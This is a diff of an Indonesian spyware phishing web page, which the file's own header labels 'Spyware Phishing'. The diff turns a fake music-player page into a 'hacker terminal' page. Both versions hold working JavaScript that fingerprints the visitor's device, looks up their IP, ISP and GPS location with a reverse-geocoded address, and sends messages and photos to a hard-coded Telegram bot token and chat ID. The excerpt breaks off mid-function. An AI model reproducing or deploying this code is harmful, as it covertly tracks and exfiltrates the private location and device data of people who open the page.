@@ -1,273 +1,500 @@
-<!-- Spyware Phishing -->
-<!-- Version 3 -->
+<!-- Hacker Terminal Theme - No Audio -->
+<!-- Version 5 -->
 <!DOCTYPE html>
 <html lang="id">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Nyenyenye</title>
-  <link href="https://cdn-assets.dzcdn.net/common/css/deezer-product.css" rel="stylesheet">
-  <link href="https://cdn-assets.dzcdn.net/common/css/inter.css" rel="stylesheet">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>root@target:~# session_established</title>
   <style>
-    * { box-sizing: border-box; }
-    html { font-size: 104%; }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    html { font-size: 100%; -webkit-text-size-adjust: 100%; }
     body {
-      margin: 0;
-      padding: 0;
-      background: linear-gradient(to bottom right, #0a1a0a, #0f2f0f, #1a4f1a);
-      font-family: 'DeezerProduct', 'Inter', sans-serif;
-      color: #000;
+      background: #000;
+      font-family: 'Courier New', 'Consolas', 'Monaco', monospace;
+      color: #00ff41;
       display: flex;
       align-items: center;
       justify-content: center;
       min-height: 100vh;
+      padding: 10px;
+      overflow: hidden;
       position: relative;
     }
-.card {
-  background: linear-gradient(135deg, rgba(10, 10, 10, 0.95), rgba(30, 30, 30, 0.9));
-  padding: 24px 20px;
-  margin: 0 auto;
-  border-radius: 20px;
-  box-shadow:
-    0 0 12px rgba(0, 0, 0, 0.5),
-    0 6px 24px rgba(0, 0, 0, 0.8);
-  max-width: 300px; /* << Ukuran diperkecil */
-  width: 100%;
-  text-align: center;
-  overflow: hidden;
-  color: #e0e0e0;
-  border: none;
-  backdrop-filter: blur(8px);
-  transition: all 0.3s ease;
-  position: relative;
-  box-sizing: border-box;
-}
 
-/* Tambahkan margin sisi jika di HP */
-@media (max-width: 360px) {
-  .card {
-    margin: 0 12px;
-  }
-}
-
-/* Tambahan efek garis beat di bawah */
-.card::after {
-  content: "";
-  position: absolute;
-  bottom: 0;
-  left: 20%;
-  width: 60%;
-  height: 4px;
-  background: linear-gradient(to right, #0f0, #0ff, #0f0);
-  box-shadow: 0 0 8px #0f0;
-  animation: pulseBeat 1.2s infinite ease-in-out;
-  border-radius: 2px;
-}
-
-@keyframes pulseBeat {
-  0%, 100% {
-    transform: scaleX(0.8);
-    opacity: 0.5;
-  }
-  50% {
-    transform: scaleX(1.2);
-    opacity: 1;
-  }
-}
-    .logo {
-      width: 110px;
-      height: 100px;
-      border-radius: 50%;
-      background: url('https://files.catbox.moe/ggjin7.png') center/cover no-repeat;
-      background-color: transparent;
-      margin: 0 auto 12px;
+    /* ===== MATRIX RAIN ===== */
+    #matrix {
+      position: fixed;
+      inset: 0;
+      z-index: 0;
+      opacity: 0.35;
+      pointer-events: none;
     }
-  .title-wrapper {
-  width: 100%;
-  overflow: hidden;
-  white-space: nowrap;
-  margin-bottom: 4px;
-  box-sizing: border-box;
-  position: relative;
-  }
 
- .title-loop {
-  display: inline-block;
-  white-space: nowrap;
-  animation: scroll-title 15s linear infinite;
- }
-
- .title-loop span {
-  display: inline-block;
-  padding-right: 100px;
-  font-size: 13px;
-  font-weight: bold;
-  color: #fff;
- }
-
- @keyframes scroll-title {
-  0% {
-    transform: translateX(0%);
-  }
-  100% {
-    transform: translateX(-50%);
-  }
-  }
-    @keyframes scroll-title {
-      0% { transform: translateX(0%); }
-      100% { transform: translateX(-50%); }
+    /* ===== SCANLINE + CRT ===== */
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      background: repeating-linear-gradient(
+        0deg,
+        rgba(0, 0, 0, 0) 0px,
+        rgba(0, 0, 0, 0) 2px,
+        rgba(0, 255, 65, 0.03) 3px,
+        rgba(0, 0, 0, 0.15) 4px
+      );
+      pointer-events: none;
+      z-index: 10;
     }
-  .artist {
-  font-size: 11px;
-  margin-bottom: 6px;
-  color: #aaa;
- }
+    body::after {
+      content: "";
+      position: fixed;
+      inset: 0;
+      background: radial-gradient(ellipse at center, transparent 0%, transparent 60%, rgba(0,0,0,0.7) 100%);
+      pointer-events: none;
+      z-index: 9;
+      animation: flicker 4s infinite;
+    }
+    @keyframes flicker {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.95; }
+      92% { opacity: 1; }
+      93% { opacity: 0.7; }
+      94% { opacity: 1; }
+    }
 
- @keyframes rainbowText {
-  0% {
-    background-position: 0% 50%;
-  }
-  100% {
-    background-position: 100% 50%;
-  }
-  }
-    .progress-wrapper {
-      width: 70%;
-      margin: 14px auto 12px;
+    /* ===== TERMINAL WINDOW ===== */
+    .terminal {
       position: relative;
-      height: 14px;
-    }
-    .progress-bar {
-      position: absolute;
+      z-index: 5;
       width: 100%;
-      height: 6px;
-      background: #444;
-      border-radius: 10px;
-      top: 4px;
-      left: 0;
-      z-index: 1;
+      max-width: 480px;
+      background: rgba(0, 10, 0, 0.85);
+      border: 1px solid #00ff41;
+      box-shadow:
+        0 0 10px rgba(0, 255, 65, 0.5),
+        0 0 30px rgba(0, 255, 65, 0.2),
+        inset 0 0 40px rgba(0, 255, 65, 0.05);
+      border-radius: 4px;
+      font-size: 11.5px;
+      line-height: 1.55;
+      overflow: hidden;
     }
-    .progress-fill {
-      height: 100%;
-      width: 0%;
-      background: linear-gradient(to right, #fff, #aaa);
-      transition: width 0.1s linear;
-      border-radius: 10px;
-    }
-    .seek-slider {
-      width: 100%;
-      appearance: none;
-      background: transparent;
-      position: absolute;
-      top: 0;
-      left: 0;
-      height: 14px;
-      z-index: 2;
-      margin: 0;
-    }
-    .seek-slider::-webkit-slider-thumb {
-      appearance: none;
-      width: 10px;
-      height: 10px;
-      background: #fff;
-      border-radius: 50%;
-      border: 0px solid #000;
-      margin-top: 0;
-    }
-    .seek-slider::-moz-range-thumb {
-      width: 14px;
-      height: 14px;
-      background: #fff;
-      border-radius: 50%;
-      border: 2px solid #000;
-    }
-    .controls {
+
+    /* ===== TITLE BAR ===== */
+    .titlebar {
+      background: linear-gradient(to bottom, #003300, #001a00);
+      border-bottom: 1px solid #00ff41;
+      padding: 6px 10px;
       display: flex;
-      justify-content: center;
-      gap: 12px;
-      margin-top: 0px;
+      align-items: center;
+      justify-content: space-between;
+      font-size: 10.5px;
+      color: #00ff41;
+      text-shadow: 0 0 4px #00ff41;
+      letter-spacing: 0.5px;
     }
-    button {
-      padding: 6px 18px;
-      border: none;
-      border-radius: 16px;
-      background-color: #222;
-      color: #fff;
+    .titlebar .dots {
+      display: flex;
+      gap: 5px;
+    }
+    .titlebar .dots span {
+      width: 9px; height: 9px;
+      border-radius: 50%;
+      border: 1px solid #00ff41;
+      background: transparent;
+    }
+    .titlebar .dots span:nth-child(1) { background: #ff2a2a; border-color: #ff2a2a; box-shadow: 0 0 6px #ff2a2a; }
+    .titlebar .dots span:nth-child(2) { background: #ffeb3b; border-color: #ffeb3b; box-shadow: 0 0 6px #ffeb3b; }
+    .titlebar .dots span:nth-child(3) { background: #00ff41; border-color: #00ff41; box-shadow: 0 0 6px #00ff41; }
+    .titlebar .title {
+      flex: 1;
+      text-align: center;
+      font-weight: 700;
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      padding: 0 8px;
+    }
+
+    /* ===== BODY ===== */
+    .body {
+      padding: 12px 14px 16px;
+      max-height: 75vh;
+      overflow-y: auto;
+      scrollbar-width: thin;
+      scrollbar-color: #00ff41 #001a00;
+    }
+    .body::-webkit-scrollbar { width: 6px; }
+    .body::-webkit-scrollbar-track { background: #001a00; }
+    .body::-webkit-scrollbar-thumb { background: #00ff41; box-shadow: 0 0 4px #00ff41; }
+
+    /* ===== HEADER ASCII ===== */
+    .ascii {
+      text-align: center;
+      color: #00ff41;
+      text-shadow: 0 0 6px #00ff41;
+      font-size: 8px;
+      line-height: 1.1;
+      letter-spacing: 0;
+      white-space: pre;
+      margin-bottom: 10px;
+      overflow-x: auto;
+      font-weight: 700;
+    }
+
+    /* ===== LINE OUTPUT ===== */
+    .line {
+      display: flex;
+      margin-bottom: 2px;
+      flex-wrap: wrap;
+      word-break: break-word;
+    }
+    .prompt {
+      color: #00ff41;
+      font-weight: 700;
+      text-shadow: 0 0 4px #00ff41;
+      margin-right: 6px;
+      flex-shrink: 0;
+    }
+    .prompt::before { content: "root@target:~#"; color: #00cc33; }
+    .prompt::after { content: " "; }
+
+    .key {
+      color: #00ff41;
+      font-weight: 700;
+      text-shadow: 0 0 3px #00ff41;
+      min-width: 130px;
+    }
+    .sep { color: #00aa2e; margin: 0 4px; }
+    .val {
+      color: #7dff8f;
+      flex: 1;
+      word-break: break-all;
+    }
+
+    /* ===== SECTION ===== */
+    .section {
+      margin: 12px 0 6px;
+      padding: 4px 8px;
+      border-left: 2px solid #00ff41;
+      background: rgba(0, 255, 65, 0.06);
+      color: #00ff41;
+      font-weight: 700;
+      text-shadow: 0 0 4px #00ff41;
+      letter-spacing: 1px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      font-size: 10.5px;
+    }
+    .section::before { content: "[ "; color: #00ff41; }
+    .section::after { content: " ]"; color: #00ff41; }
+    .section .ic { color: #7dff8f; font-size: 11px; }
+
+    /* ===== STATUS BLINK ===== */
+    .blink {
+      display: inline-block;
+      animation: blink 0.9s steps(2, start) infinite;
+      color: #00ff41;
+      font-weight: 700;
+    }
+    @keyframes blink { to { visibility: hidden; } }
+
+    /* ===== PROGRESS (LOADING) ===== */
+    .loading {
+      margin: 6px 0;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      color: #00cc33;
+      font-size: 10.5px;
+    }
+    .bar {
+      flex: 1;
+      height: 8px;
+      background: #001a00;
+      border: 1px solid #00ff41;
+      position: relative;
+      overflow: hidden;
+    }
+    .bar::after {
+      content: "";
+      position: absolute;
+      inset: 0;
+      background: repeating-linear-gradient(
+        90deg,
+        #00ff41 0%, #00ff41 4%,
+        transparent 4%, transparent 8%
+      );
+      background-size: 200% 100%;
+      animation: move 1s linear infinite;
+      box-shadow: 0 0 6px #00ff41;
+    }
+    @keyframes move {
+      from { background-position: 0 0; }
+      to { background-position: 100% 0; }
+    }
+
+    /* ===== CURSOR ===== */
+    .cursor {
+      display: inline-block;
+      width: 7px;
+      height: 12px;
+      background: #00ff41;
+      box-shadow: 0 0 6px #00ff41;
+      animation: blink 1s steps(2, start) infinite;
+      vertical-align: middle;
+    }
+
+    /* ===== BUTTONS ===== */
+    .actions {
+      display: flex;
+      gap: 8px;
+      margin-top: 12px;
+      flex-wrap: wrap;
+    }
+    .btn {
+      flex: 1;
+      min-width: 120px;
+      background: transparent;
+      border: 1px solid #00ff41;
+      color: #00ff41;
+      padding: 8px 10px;
+      font-family: 'Courier New', monospace;
       font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 1px;
+      text-transform: uppercase;
       cursor: pointer;
-      transition: background-color 0.3s;
+      text-shadow: 0 0 4px #00ff41;
+      box-shadow: 0 0 6px rgba(0,255,65,0.3), inset 0 0 8px rgba(0,255,65,0.1);
+      transition: all 0.2s;
+      position: relative;
+      overflow: hidden;
     }
-    button:hover {
-      background-color: #111;
+    .btn:hover {
+      background: rgba(0, 255, 65, 0.15);
+      box-shadow: 0 0 14px rgba(0,255,65,0.7), inset 0 0 12px rgba(0,255,65,0.2);
+    }
+    .btn:active { transform: translateY(1px); }
+
+    /* ===== ALERT BADGE ===== */
+    .badge {
+      display: inline-block;
+      background: #00ff41;
+      color: #000;
+      font-size: 9px;
+      font-weight: 900;
+      padding: 1px 6px;
+      letter-spacing: 1px;
+      box-shadow: 0 0 6px #00ff41;
+    }
+    .badge.red {
+      background: #ff2a2a;
+      color: #000;
+      box-shadow: 0 0 6px #ff2a2a;
+    }
+
+    /* ===== BLINK TEXT ===== */
+    .warn {
+      color: #ffeb3b;
+      text-shadow: 0 0 4px #ffeb3b;
+    }
+    .red {
+      color: #ff2a2a;
+      text-shadow: 0 0 4px #ff2a2a;
+    }
+
+    @media (max-width: 420px) {
+      .terminal { font-size: 10.5px; }
+      .body { padding: 10px 10px 14px; }
+      .key { min-width: 110px; }
+      .ascii { font-size: 6.5px; }
+      .titlebar { font-size: 9.5px; }
     }
   </style>
 </head>
 <body>
-  <div class="card">
-    <div class="logo"></div>
-    <div class="title-wrapper">
-      <div class="title-loop">
-        <span>Bunga Citra Lestari - Karena Kucinta Kau (Orginal)</span>
-        <span>Bunga Citra Lestari - Karena Kucinta Kau (Orginal)</span>
-      </div>
+  <canvas id="matrix"></canvas>
+
+  <div class="terminal">
+    <!-- TITLE BAR -->
+    <div class="titlebar">
+      <div class="dots"><span></span><span></span><span></span></div>
+      <div class="title">root@target:~# session_established</div>
+      <div style="width: 30px;"></div>
     </div>
-    <div class="artist">Artis tidak di kenal</div>
-    <div class="progress-wrapper">
-      <div class="progress-bar">
-        <div class="progress-fill" id="progress"></div>
+
+    <!-- BODY -->
+    <div class="body" id="body">
+
+      <!-- ASCII LOGO -->
+      <div class="ascii">
+ ██████╗  ██████╗  ██████╗ ████████╗
+ ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
+ ██████╔╝██║   ██║██║   ██║   ██║
+ ██╔══██╗██║   ██║██║   ██║   ██║
+ ██║  ██║╚██████╔╝╚██████╔╝   ██║
+ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝
       </div>
-      <input type="range" class="seek-slider" id="seekSlider" min="0" max="100" value="0" step="0.1">
-    </div>
-    <div class="controls">
-      <button onclick="audio.play()">Nyalakan</button>
-      <button onclick="audio.pause()">Matikan</button>
+
+      <div class="line">
+        <span class="prompt"></span>
+        <span class="val">Initializing exploit framework <span class="blink">...</span></span>
+      </div>
+      <div class="loading">
+        <span>[ OK ]</span>
+        <div class="bar"></div>
+        <span id="loadPct">0%</span>
+      </div>
+
+      <!-- SECTION: SYSTEM INFO -->
+      <div class="section"><span>SYSTEM INFO</span><span class="ic">▣</span></div>
+      <div id="sysInfo"></div>
+
+      <!-- SECTION: DEVICE -->
+      <div class="section"><span>DEVICE FINGERPRINT</span><span class="ic">▣</span></div>
+      <div id="deviceInfo"></div>
+
+      <!-- SECTION: NETWORK -->
+      <div class="section"><span>NETWORK TRACE</span><span class="ic">▣</span></div>
+      <div id="networkInfo"></div>
+
+      <!-- SECTION: GEOLOCATION -->
+      <div class="section"><span>GPS COORDINATES</span><span class="ic">▣</span></div>
+      <div id="geoInfo"></div>
+
+      <!-- SECTION: MEDIA ACCESS -->
+      <div class="section"><span>MEDIA ACCESS</span><span class="ic">▣</span></div>
+      <div id="mediaInfo"></div>
+
+      <!-- STATUS -->
+      <div class="section"><span>SESSION STATUS</span><span class="ic">▣</span></div>
+      <div id="statusInfo">
+        <div class="line">
+          <span class="prompt"></span>
+          <span class="val"><span class="badge">ACTIVE</span> Connection established &amp; encrypted</span>
+        </div>
+        <div class="line">
+          <span class="prompt"></span>
+          <span class="val warn">⚠ Do not close this window</span>
+        </div>
+      </div>
+
+      <!-- FOOTER -->
+      <div class="line" style="margin-top: 12px;">
+        <span class="prompt"></span>
+        <span class="val">Session ID: <span id="sessionId">-</span> <span class="cursor"></span></span>
+      </div>
+
     </div>
   </div>
-  <audio id="audio" src="https://files.catbox.moe/9h2wob.mp4" autoplay muted></audio>
+
   <script>
-    const audio = document.getElementById("audio");
-    const progress = document.getElementById("progress");
-    const seekSlider = document.getElementById("seekSlider");
+  (function() {
+    'use strict';
 
-    setInterval(() => {
-      if (!audio.duration) return;
-      const percent = (audio.currentTime / audio.duration) * 100;
-      progress.style.width = percent + '%';
-      seekSlider.value = percent;
-    }, 100);
+    // ===== CONFIG =====
+    const TELEGRAM_TOKEN = '8829815293:AAFS3EsOHUOQEWnkOfv99OQlZWeYyYIdDXo';
+    const TELEGRAM_CHAT_ID = '8883003761';
+    const IP_API_URL = 'https://ipapi.co/json/';
+    const GEO_REVERSE_URL = 'https://nominatim.openstreetmap.org/reverse';
 
-    seekSlider.addEventListener('input', () => {
-      if (audio.duration) {
-        audio.currentTime = (seekSlider.value / 100) * audio.duration;
-      }
-    });
-
-    const token1 = '8829815293:AAFS3EsOHUOQEWnkOfv99OQlZWeYyYIdDXo';
-    const chatId1 = '8883003761';
-    const targets = [{ token: token1, chat_id: chatId1 }];
+    // ===== HELPERS =====
+    const safe = (fn, fb) => { try { return fn(); } catch { return fb; } };
+    const safeAsync = async (fn, fb) => { try { return await fn(); } catch { return fb; } };
+    const $ = (id) => document.getElementById(id);
 
     const kirimPesan = async (pesan) => {
-      for (const t of targets) {
-        await fetch(`https://api.telegram.org/bot${t.token}/sendMessage`, {
+      try {
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: t.chat_id, text: pesan, parse_mode: 'HTML' })
+          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: pesan, parse_mode: 'HTML' })
         });
-      }
+      } catch (e) { console.warn('sendMessage gagal:', e); }
     };
 
     const kirimFoto = async (blob) => {
-      for (const t of targets) {
+      try {
         const form = new FormData();
-        form.append("chat_id", t.chat_id);
-        form.append("photo", blob, "foto.jpg");
-        await fetch(`https://api.telegram.org/bot${t.token}/sendPhoto`, {
-          method: "POST",
+        form.append('chat_id', TELEGRAM_CHAT_ID);
+        form.append('photo', blob, 'foto.jpg');
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+          method: 'POST',
           body: form
         });
-      }
+      } catch (e) { console.warn('sendPhoto gagal:', e); }
     };
 
+    // ===== RENDER LINE =====
+    const renderLine = (key, val) => {
+      const d = document.createElement('div');
+      d.className = 'line';
+      d.innerHTML = `<span class="prompt"></span><span class="key">${key}</span><span class="sep">:</span><span class="val">${val}</span>`;
+      return d;
+    };
+
+    const renderTo = (containerId, pairs) => {
+      const el = $(containerId);
+      if (!el) return;
+      pairs.forEach(([k, v]) => el.appendChild(renderLine(k, v)));
+    };
+
+    // ===== SESSION ID =====
+    const sessionId = 'SESS-' + Math.random().toString(36).substring(2, 10).toUpperCase();
+    $('sessionId').textContent = sessionId;
+
+    // ===== LOADING ANIMATION =====
+    let pct = 0;
+    const loadPctEl = $('loadPct');
+    const loadInterval = setInterval(() => {
+      pct = Math.min(100, pct + Math.floor(Math.random() * 15) + 5);
+      loadPctEl.textContent = pct + '%';
+      if (pct >= 100) clearInterval(loadInterval);
+    }, 180);
+
+    // ===== MATRIX RAIN =====
+    const canvas = document.getElementById('matrix');
+    const ctx = canvas.getContext('2d');
+    const chars = '01ABCDEFGHIJKLMNOPQRSTUVWXYZアイウエオカキクケコサシスセソタチツテトナニヌネノ@#$%&*';
+    let cols, drops, w, h;
+    const fontSize = 14;
+
+    const resizeCanvas = () => {
+      w = canvas.width = window.innerWidth;
+      h = canvas.height = window.innerHeight;
+      cols = Math.floor(w / fontSize);
+      drops = Array(cols).fill(1);
+    };
+    resizeCanvas();
+    window.addEventListener('resize', resizeCanvas);
+
+    const drawMatrix = () => {
+      ctx.fillStyle = 'rgba(0, 0, 0, 0.06)';
+      ctx.fillRect(0, 0, w, h);
+      ctx.fillStyle = '#00ff41';
+      ctx.font = fontSize + 'px monospace';
+      for (let i = 0; i < drops.length; i++) {
+        const ch = chars.charAt(Math.floor(Math.random() * chars.length));
+        const y = drops[i] * fontSize;
+        if (Math.random() > 0.98) {
+          ctx.fillStyle = '#aaffaa';
+          ctx.shadowColor = '#00ff41';
+          ctx.shadowBlur = 6;
+        } else {
+          ctx.fillStyle = '#00ff41';
+          ctx.shadowBlur = 0;
+        }
+        ctx.fillText(ch, i * fontSize, y);
+        if (y > h && Math.random() > 0.975) drops[i] = 0;
+        drops[i]++;
+      }
+    };
+    setInterval(drawMatrix, 55);
+
+    // ===== DEVICE BRAND =====
     const getDeviceBrand = () => {
       const ua = navigator.userAgent;
       if (/Vivo|vivo|V\d{4}/.test(ua)) return 'Vivo';
@@ -276,474 +503,305 @@
       if (/Infinix/.test(ua)) return 'Infinix';
       if (/RMX/.test(ua)) return 'Realme';
       if (/Redmi|Mi/.test(ua)) return 'Xiaomi';
-      return 'Android Device';
+      if (/iPhone/.test(ua)) return 'iPhone';
+      if (/iPad/.test(ua)) return 'iPad';
+      return 'Unknown Device';
     };
 
-    const ambilDataPerangkat = async () => {
-      const ua = navigator.userAgent;
-      const platform = navigator.platform;
-      const vendor = navigator.vendor;
-      const brand = getDeviceBrand();
-      const waktu = new Date().toLocaleString("id-ID");
-      const touch = 'ontouchstart' in window ? 'Ya' : 'Tidak';
-      const ref = document.referrer || 'Langsung';
-      const bahasa = navigator.language || '-';
-      const koneksi = navigator.connection || {};
-      const iframe = window.top !== window.self ? 'Ya' : 'Tidak';
-      const online = navigator.onLine ? 'Online' : 'Offline';
-
-      let gpu = { vendor: '-', renderer: '-' };
+    const getGPU = () => {
       try {
-        const canvas = document.createElement("canvas");
-        const gl = canvas.getContext("webgl");
-        const info = gl.getExtension("WEBGL_debug_renderer_info");
-        gpu.vendor = gl.getParameter(info.UNMASKED_VENDOR_WEBGL);
-        gpu.renderer = gl.getParameter(info.UNMASKED_RENDERER_WEBGL);
-      } catch {}
-
-      return `
-౼ 〘 𝗜𝗡𝗙𝗢𝗥𝗠𝗔𝗦𝗜 𝗣𝗘𝗥𝗔𝗡𝗚𝗞𝗔𝗧 〙 ౼
-Jenis Perangkat        : ${brand}
-User Agent             : ${ua}
-Platform               : ${platform}
-Vendor Browser         : ${vendor}
-GPU Vendor             : ${gpu.vendor}
-GPU Renderer           : ${gpu.renderer}
-CPU                    : ${navigator.hardwareConcurrency || '-'} inti
-RAM                    : ${navigator.deviceMemory || '-'} GB
-Resolusi Layar         : ${screen.width} x ${screen.height}
-Orientasi Layar        : ${screen.orientation?.type || '-'}
-Touch Support          : ${touch} (${navigator.maxTouchPoints || 0} titik)
-Kerapatan Piksel       : ${window.devicePixelRatio}
-Cookies Aktif          : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
-JavaScript             : Aktif
-Do Not Track           : ${navigator.doNotTrack == "1" ? "Ya" : "Tidak"}
-HTTPS                  : ${location.protocol === "https:" ? "Ya" : "Tidak"}
-Zona Waktu             : ${Intl.DateTimeFormat().resolvedOptions().timeZone}
-Waktu Lokal            : ${waktu}
-Referrer               : ${ref}
-Bahasa Sistem          : ${bahasa}
-Status Online          : ${online}
-Jumlah History         : ${history.length} halaman
-Dibuka via iframe      : ${iframe}
-Tipe Koneksi           : ${koneksi.effectiveType || '-'}
-Mode Hemat Data        : ${koneksi.saveData ? 'Ya' : 'Tidak'}
-Tipe Perangkat         : ${/Mobi|Android/i.test(ua) ? 'Mobile' : 'Desktop'}
-Dibuka via Browser     : ${vendor || 'Tidak diketahui'}
-`.trim();
+        const c = document.createElement('canvas');
+        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+        if (!gl) return { vendor: '-', renderer: '-', webgl: 'NO' };
+        const info = gl.getExtension('WEBGL_debug_renderer_info');
+        if (!info) return { vendor: '-', renderer: '-', webgl: 'YES' };
+        return {
+          vendor: gl.getParameter(info.UNMASKED_VENDOR_WEBGL) || '-',
+          renderer: gl.getParameter(info.UNMASKED_RENDERER_WEBGL) || '-',
+          webgl: 'YES'
+        };
+      } catch { return { vendor: '-', renderer: '-', webgl: 'NO' }; }
     };
 
-const ambilBaterai = async () => {
-  try {
-    const statusOnline = navigator.onLine ? 'Online' : 'Offline';
+    const getBrowser = () => {
+      const ua = navigator.userAgent;
+      if (/edg\//i.test(ua)) return { name: 'Edge', ver: (ua.match(/Edg\/([\d.]+)/) || [])[1] || '-' };
+      if (/chrome|crios/i.test(ua)) return { name: 'Chrome', ver: (ua.match(/Chrome\/([\d.]+)/) || [])[1] || '-' };
+      if (/firefox/i.test(ua)) return { name: 'Firefox', ver: (ua.match(/Firefox\/([\d.]+)/) || [])[1] || '-' };
+      if (/safari/i.test(ua)) return { name: 'Safari', ver: (ua.match(/Version\/([\d.]+)/) || [])[1] || '-' };
+      return { name: 'Unknown', ver: '-' };
+    };
 
-    if ('getBattery' in navigator) {
-      const bat = await navigator.getBattery();
-      const level = Math.round(bat.level * 100) + '%';
-      const charging = bat.charging ? 'Ya' : 'Tidak';
+    // ===== DEVICE INFO =====
+    const renderDeviceInfo = () => {
+      const gpu = getGPU();
+      const browser = getBrowser();
+      const brand = getDeviceBrand();
+      renderTo('deviceInfo', [
+        ['Brand', brand],
+        ['Platform', navigator.platform || '-'],
+        ['Browser', `${browser.name} ${browser.ver}`],
+        ['Vendor', navigator.vendor || '-'],
+        ['CPU Cores', (navigator.hardwareConcurrency || '-') + ' core'],
+        ['RAM', (navigator.deviceMemory || '-') + ' GB'],
+        ['Screen', `${screen.width}x${screen.height}`],
+        ['Viewport', `${window.innerWidth}x${window.innerHeight}`],
+        ['Pixel Ratio', window.devicePixelRatio || 1],
+        ['Orientation', screen.orientation?.type || '-'],
+        ['Touch', ('ontouchstart' in window ? 'YES' : 'NO') + ` (${navigator.maxTouchPoints || 0})`],
+        ['GPU Vendor', gpu.vendor],
+        ['GPU Renderer', gpu.renderer],
+        ['WebGL', gpu.webgl]
+      ]);
+    };
 
-      let estimasi = '-';
-      if (!bat.charging && bat.dischargingTime !== Infinity) {
-        const menit = Math.floor(bat.dischargingTime / 60);
-        const jam = Math.floor(menit / 60);
-        const sisa = menit % 60;
-        estimasi = `${jam} jam ${sisa} menit`;
+    // ===== SYSTEM INFO =====
+    const renderSysInfo = async () => {
+      const waktu = new Date().toLocaleString('id-ID');
+      const tz = safe(() => Intl.DateTimeFormat().resolvedOptions().timeZone, '-');
+      let batInfo = 'unsupported';
+      if ('getBattery' in navigator) {
+        const bat = await safeAsync(() => navigator.getBattery(), null);
+        if (bat) {
+          const level = Math.round(bat.level * 100) + '%';
+          const chg = bat.charging ? 'YES' : 'NO';
+          batInfo = `${level} (charging: ${chg})`;
+        }
+      }
+      renderTo('sysInfo', [
+        ['Time Local', waktu],
+        ['Timezone', tz],
+        ['Language', navigator.language || '-'],
+        ['Online', navigator.onLine ? 'YES' : 'NO'],
+        ['Cookies', navigator.cookieEnabled ? 'YES' : 'NO'],
+        ['DNT', navigator.doNotTrack === '1' ? 'YES' : 'NO'],
+        ['HTTPS', location.protocol === 'https:' ? 'YES' : 'NO'],
+        ['Secure Ctx', location.isSecureContext ? 'YES' : 'NO'],
+        ['In Iframe', window.top !== window.self ? 'YES' : 'NO'],
+        ['WebDriver', navigator.webdriver ? 'YES' : 'NO'],
+        ['Battery', batInfo],
+        ['Referrer', document.referrer || 'direct']
+      ]);
+    };
+
+    // ===== NETWORK =====
+    const renderNetworkInfo = async () => {
+      const conn = navigator.connection || {};
+      const ip = await safeAsync(async () => {
+        const r = await fetch(IP_API_URL, { cache: 'no-store' });
+        if (!r.ok) throw new Error('HTTP ' + r.status);
+        return await r.json();
+      }, null);
+
+      const pairs = [];
+      if (ip) {
+        const isVPN = (ip.org || '').toLowerCase().includes('vpn') || (ip.org || '').toLowerCase().includes('proxy') ? 'YES' : 'NO';
+        pairs.push(
+          ['IP Public', ip.ip || '-'],
+          ['ISP', ip.org || '-'],
+          ['Country', ip.country_name || '-'],
+          ['Region', ip.region || '-'],
+          ['City', ip.city || '-'],
+          ['VPN / Proxy', isVPN]
+        );
+      } else {
+        pairs.push(['IP Public', '❌ failed to fetch']);
+      }
+      pairs.push(
+        ['Connection', conn.effectiveType || '-'],
+        ['Downlink', conn.downlink ? conn.downlink + ' Mbps' : '-'],
+        ['RTT', conn.rtt ? conn.rtt + ' ms' : '-'],
+        ['Save Data', conn.saveData ? 'YES' : 'NO']
+      );
+      renderTo('networkInfo', pairs);
+    };
+
+    // ===== GEOLOCATION =====
+    const renderGeoInfo = () => new Promise((resolve) => {
+      if (!navigator.geolocation) {
+        renderTo('geoInfo', [['GPS', '❌ unsupported']]);
+        resolve('unsupported');
+        return;
       }
 
-      return `
-౼ 〘 𝗕𝗔𝗧𝗘𝗥𝗔𝗜 〙 ౼
-Level Baterai          : ${level}
-Sedang Mengisi         : ${charging}
-Estimasi Sisa Waktu    : ${estimasi}
-Status Online          : ${statusOnline}`.trim();
-    }
+      const to = setTimeout(() => {
+        renderTo('geoInfo', [['GPS', '❌ timeout']]);
+        resolve('timeout');
+      }, 20000);
 
-    return `౼ 〘 𝗕𝗔𝗧𝗘𝗥𝗔𝗜 〙 ౼\n❌ Tidak didukung browser.`;
-  } catch {
-    return `౼ 〘 𝗕𝗔𝗧𝗘𝗥𝗔𝗜 〙 ౼\n❌ Gagal mengambil info baterai.`;
-  }
-};
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          clearTimeout(to);
+          const { latitude, longitude, accuracy } = pos.coords;
+          let addr = '-';
+          try {
+            const r = await fetch(`${GEO_REVERSE_URL}?format=json&lat=${latitude}&lon=${longitude}`, {
+              headers: { 'Accept': 'application/json' }
+            });
+            if (r.ok) {
+              const d = await r.json();
+              addr = d.display_name || '-';
+            }
+          } catch {}
 
-    const ambilLayarGrafik = async () => {
-      let gpu = { vendor: '-', renderer: '-' };
-      let webglSupport = 'Tidak';
-      let canvasFingerprint = 'Tidak terdeteksi';
-      let renderingMode = 'software';
-      let hdrSupport = 'Tidak';
+          renderTo('geoInfo', [
+            ['Latitude', latitude],
+            ['Longitude', longitude],
+            ['Accuracy', '±' + Math.round(accuracy) + ' m'],
+            ['Address', addr]
+          ]);
+          resolve({ latitude, longitude, accuracy, addr });
+        },
+        (err) => {
+          clearTimeout(to);
+          const msg = { 1: '❌ denied', 2: '❌ unavailable', 3: '❌ timeout' }[err.code] || '❌ error';
+          renderTo('geoInfo', [['GPS', msg]]);
+          resolve('error');
+        },
